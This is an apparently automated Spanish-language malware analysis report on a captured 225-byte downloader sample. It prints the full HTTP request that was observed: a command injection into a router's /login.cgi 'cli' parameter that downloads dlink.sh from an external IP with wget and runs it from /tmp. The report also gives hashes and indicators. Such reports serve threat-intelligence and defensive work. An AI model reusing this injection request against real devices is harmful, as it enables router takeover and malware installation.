# 🧬 Payload Analysis

`75f9016a9f6bfc836a73e2d0a52b7d566d4b5c8d67777399804cda5828e80cd4`

## 📌 Resumen

Texto ASCII de 225 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `dlink.sh` en `hxxp://196.251.121.XXX/a3f8d2/dlink.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh /tmp/kh'$`
2. `wget hxxp://196.251.121.XXX/a3f8d2/dlink.sh -O -> /tmp/kh`
3. `sh /tmp/kh'$ HTTP/` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/75f9016a9f6bfc836a73e2d0a52b7d566d4b5c8d67777399804cda5828e80cd4.md](../../../../../malware-like/oraculo/downloader/75f9016a9f6bfc836a73e2d0a52b7d566d4b5c8d67777399804cda5828e80cd4.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:50:21.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `75f9016a9f6bfc836a73e2d0a52b7d566d4b5c8d67777399804cda5828e80cd4`
- **SHA1:** `4967999d3a9b8b983d7bff6b061f689f6bd82f35`
- **MD5:** `14bad25e11b07a7544c40f3ebad976c4`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 225 B |
| Entropía | 5.3 |
| Strings | 5 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)
- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /login.cgi?cli=aa%20aa%27;wget%20http://196.251.121.XXX/a3f8d2/dlink.sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://196.251.121.XXX/a3f8d2/dlink.sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ | strings |
| ip | 196.251.121.XXX | static_analysis |
| command | GET /login.cgi?cli=aa%20aa%27;wget%20http://196.251.121.XXX/a3f8d2/dlink.sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/ | strings |
| hash | 75f9016a9f6bfc836a73e2d0a52b7d566d4b5c8d67777399804cda5828e80cd4 | static_analysis |
| ip | 170.155.2.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
